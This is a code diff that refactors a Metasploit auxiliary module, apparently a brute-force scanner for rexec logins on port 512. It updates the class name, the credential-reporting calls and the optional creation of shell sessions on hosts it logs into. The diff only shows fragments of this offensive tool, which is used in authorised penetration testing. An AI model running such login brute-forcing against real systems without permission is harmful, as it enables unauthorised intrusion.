@@ -1,12 +1,9 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
-
-class Metasploit3 < Msf::Auxiliary
-
+class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::Tcp
   include Msf::Auxiliary::Report
   include Msf::Auxiliary::AuthBrute
@@ -36,7 +33,7 @@ class Metasploit3 < Msf::Auxiliary
         Opt::RPORT(512),
         OptBool.new('ENABLE_STDERR', [ true, 'Enables connecting the stderr port', false ]),
         OptInt.new( 'STDERR_PORT',   [ false, 'The port to listen on for stderr', nil ])
-      ], self.class)
+      ])
   end
 
   def run_host(ip)
@@ -108,8 +105,8 @@ class Metasploit3 < Msf::Auxiliary
 
   # For debugging only.
   #rescue ::Exception
-  #	print_error("#{$!}")
-  #	return :abort
+  #  print_error("#{$!}")
+  #return :abort
 
   ensure
     disconnect()
@@ -161,31 +158,33 @@ class Metasploit3 < Msf::Auxiliary
 
 
   def start_rexec_session(host, port, user, pass, proof, stderr_sock)
-    report_auth_info(
-      :host	=> host,
-      :port	=> port,
-      :sname => 'exec',
-      :user	=> user,
-      :pass	=> pass,
-      :proof  => proof,
-      :source_type => "user_supplied",
-      :active => true
-    )
-
-    merge_me = {
-      'USERPASS_FILE' => nil,
-      'USER_FILE'     => nil,
-      'PASS_FILE'     => nil,
-      'USERNAME'      => user,
-      'PASSWORD'      => pass,
-      # Save a reference to the socket so we don't GC prematurely
-      :stderr_sock    => stderr_sock
+    service_data = {
+      address: host,
+      port: port,
+      service_name: 'exec',
+      proof: proof,
+      protocol: 'tcp',
+      workspace_id: myworkspace_id
     }
 
-    # Don't tie the life of this socket to the exploit
-    self.sockets.delete(stderr_sock)
+    credential_data = {
+      module_fullname: self.fullname,
+      origin_type: :service,
+      username: user,
+      # Save a reference to the socket so we don't GC prematurely
+      stderr_sock: stderr_sock
+    }.merge(service_data)
 
-    start_session(self, "rexec #{user}:#{pass} (#{host}:#{port})", merge_me)
+    login_data = {
+      core: create_credential(credential_data),
+      status: Metasploit::Model::Login::Status::UNTRIED
+    }.merge(service_data)
+
+    if datastore['CreateSession']
+      start_session(self, "rexec #{user}:#{pass} (#{host}:#{port})", login_data, false, self.sock)
+      # Don't tie the life of this socket to the exploit
+      self.sockets.delete(stderr_sock)
+      self.sock = nil
+    end
   end
-
 end
